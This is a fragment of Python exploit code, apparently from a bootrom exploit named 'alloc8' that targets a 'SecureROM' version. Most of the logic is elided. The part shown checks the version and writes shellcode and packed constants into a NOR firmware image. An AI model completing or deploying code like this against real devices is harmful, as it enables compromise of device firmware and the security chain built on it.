...
def exploit(nor, version):
    if version == '359.3':
        ...
        print(
            'ERROR: SecureROM version %s is not supported by alloc8.' %
            version)
        sys.exit(1)
    ...
    new_nor.parts[1] = shellcode[:placeholders_offset] + struct.pack('<%sI' % len(
        constants), *constants) + b'\x00' * (max_shellcode_length - len(shellcode))
